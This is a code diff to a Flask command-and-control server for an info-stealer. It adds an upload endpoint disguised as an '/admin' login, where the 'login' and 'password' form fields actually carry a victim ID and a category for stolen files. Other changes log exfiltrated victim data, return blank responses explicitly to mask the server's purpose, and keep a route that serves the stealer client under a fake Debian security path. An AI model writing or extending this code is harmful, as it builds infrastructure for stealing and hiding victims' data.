@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify
 from flask import send_from_directory
-import os, threading, logging, time
+import os, threading, logging, time, datetime
+from werkzeug.utils import secure_filename
 
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -19,8 +20,8 @@ def login_data():
 
     print(f"\n[+] Dados recebidos do cliente:\n{data}\nC2_Command > ", end="")
 
-    with open('info-gathering.txt', 'a') as f:
-        f.write(f"{data}\n")
+    with open('initial-gathering.txt', 'a') as f:
+        f.write(f"{data}\n---\n")
     return jsonify({"message": "logging successful"}), 200 # Message to mask the real purpose
 
 @app.route('/register', methods=['POST'])                  # Endpoint to receive data commands from the stealer client
@@ -30,8 +31,37 @@ def register_command():
     print(f"\n[+] Comando recebido:\n{data}\nC2_Command > ", end="")
 
     with open('command-log.txt', 'a') as f:
-        f.write(f"{data}\n")
-    return jsonify({"message": "command registered"}), 200
+        f.write(f"{data}\n---\n")
+    return "", 200                                         # Return an empty response to mask the real purpose
+
+@app.route('/admin', methods=['POST'])                     # Endpoint to receive upload files from the stealer client
+def admin_upload():
+    if 'file' not in request.files:
+        return jsonify({"error": "Admin login or password wrong"}), 400
+
+    file = request.files['file']
+
+    victim_id = request.form.get('login', 'unknown')
+    file_category = request.form.get('password', 'unknown')
+    original_path = request.form.get('file', 'unknown')
+
+    if file:
+        sanitized_filename = secure_filename(file.filename)
+        
+        save_dir = os.path.join("uploads", victim_id, file_category)
+        os.makedirs(save_dir, exist_ok=True)
+        
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+        final_filename = f"{sanitized_filename}_{timestamp}"
+        save_path = os.path.join(save_dir, final_filename)
+
+        try:
+            file.save(save_path)
+            print(f"\n[+] Arquivo recebido.\nC2_Command > ", end="")
+        except Exception as e:
+            print(f"\n[!] Erro ao salvar arquivo: {e}.\nC2_Command > ", end="")
+    print("\n[!] Arquivo não existe.\nC2_Command > ", end="")
+    return "", 200                                         # Return an empty response to mask the real purpose
 
 @app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
 def get_stealer_client():
